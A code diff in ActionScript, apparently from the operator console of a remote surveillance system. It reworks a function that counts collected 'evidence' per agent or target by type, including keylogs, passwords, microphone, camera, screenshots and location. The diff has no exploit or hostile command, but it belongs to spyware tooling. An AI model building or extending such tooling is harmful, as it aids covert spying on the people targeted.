@@ -45,7 +45,7 @@ package it.ht.rcs.console.evidence.rest
       
 		public function all(filter:Object, onResult:Function=null, onFault:Function=null):void
 		{
-			trace(ObjectUtil.toString(filter));
+			//trace(ObjectUtil.toString(filter));
       //agent, target, type, date
       this.filter=filter;
 			evidence.filterFunction=filterEvidence;
@@ -152,28 +152,120 @@ package it.ht.rcs.console.evidence.rest
 		public function total(filter:Object, onResult:Function=null, onFault:Function=null):void
 		{
       trace("total called")
-      var result:ArrayCollection=new ArrayCollection();
-      var addressbook:TypeCount=new TypeCount();
-      var application:TypeCount=new TypeCount();
-      var calendar:TypeCount=new TypeCount();
-      var call:TypeCount=new TypeCount();
-      var camera:TypeCount=new TypeCount();
-      var chat:TypeCount=new TypeCount();
-      var clipboard:TypeCount=new TypeCount();
-      var device:TypeCount=new TypeCount();
-      var file:TypeCount=new TypeCount();
-      var keylog:TypeCount=new TypeCount();
-      var message:TypeCount=new TypeCount();
-      var mic:TypeCount=new TypeCount();
-      var mouse:TypeCount=new TypeCount();
-      var password:TypeCount=new TypeCount();
-      var position:TypeCount=new TypeCount();
-      var print:TypeCount=new TypeCount();
-      var screenshot:TypeCount=new TypeCount();
-      var url:TypeCount=new TypeCount();
-      result.source=[addressbook,application,calendar,call,camera,chat,clipboard,device,file,keylog,]
-        
+      trace(ObjectUtil.toString(filter));
       
+      var result:ArrayCollection=new ArrayCollection()
+      var counts:Object=new Object()
+      
+      var addressbook:TypeCount=new TypeCount();
+      addressbook.type="addressbook";
+      counts["addressbook"]=addressbook;
+      
+      var application:TypeCount=new TypeCount();
+      application.type="application";
+      counts["application"]=application;
+      
+      var calendar:TypeCount=new TypeCount();
+      calendar.type="calendar";
+      counts["calendar"]=calendar;
+      
+      var call:TypeCount=new TypeCount();
+      call.type="call";
+      counts["call"]=call;
+      
+      var camera:TypeCount=new TypeCount();
+      camera.type="camera";
+      counts["camera"]=camera;
+      
+      var chat:TypeCount=new TypeCount();
+      chat.type="chat";
+      counts["chat"]=chat;
+      
+      var clipboard:TypeCount=new TypeCount();
+      clipboard.type="clipboard";
+      counts["clipboard"]=clipboard;
+      
+      var device:TypeCount=new TypeCount();
+      device.type="device";
+      counts["device"]=device;
+      
+      var file:TypeCount=new TypeCount();
+      file.type="file";
+      counts["file"]=file;
+      
+      var keylog:TypeCount=new TypeCount();
+      keylog.type="keylog";
+      counts["keylog"]=keylog;
+      
+      var message:TypeCount=new TypeCount();
+      message.type="message";
+      counts["message"]=message;
+      
+      var mic:TypeCount=new TypeCount();
+      mic.type="mic";
+      counts["mic"]=mic;
+      
+      var mouse:TypeCount=new TypeCount();
+      mouse.type="mouse";
+      counts["mouse"]=mouse;
+      
+      var password:TypeCount=new TypeCount();
+      password.type="password";
+      counts["password"]=password;
+      
+      var position:TypeCount=new TypeCount();
+      position.type="position";
+      counts["position"]=position;
+      
+      var print:TypeCount=new TypeCount();
+      print.type="print";
+      counts["print"]=print;
+      
+      var screenshot:TypeCount=new TypeCount();
+      screenshot.type="screenshot";
+      counts["screenshot"]=screenshot;
+      
+      var url:TypeCount=new TypeCount();
+      url.type="url";
+      counts["url"]=url;
+      
+      var total:TypeCount=new TypeCount();
+      total.type="total";
+      counts["total"]=total;
+      
+      result.source=[addressbook,application,calendar,call,camera,chat,clipboard,device,file,keylog,message,mic,mouse,password,position,print,screenshot,url, total];
+      
+      var i:uint;
+      var currentEvidence:Evidence;
+      var currentTypeCount:TypeCount;
+      //get current agent stuff
+      if(filter.agent)
+      {
+        for(i=0;i<evidence.source.length;i++)
+        {
+          currentEvidence=evidence.source[i] as Evidence;
+          if(currentEvidence.aid==filter.agent)
+          {
+            counts[currentEvidence.type].count++
+            total.count++
+          }
+        }
+      }
+      //get current target stuff
+      else
+      {
+        for(i=0;i<evidence.source.length;i++)
+        {
+          currentEvidence=evidence.source[i] as Evidence;
+          if(DBAgentDemo.getTarget(currentEvidence.aid)==filter.target)
+          {
+            counts[currentEvidence.type].count++
+            total.count++
+          }
+        }
+      }
+      
+
       if (onResult != null)
         onResult(new ResultEvent('evidence.total', false, true, result));
 		}
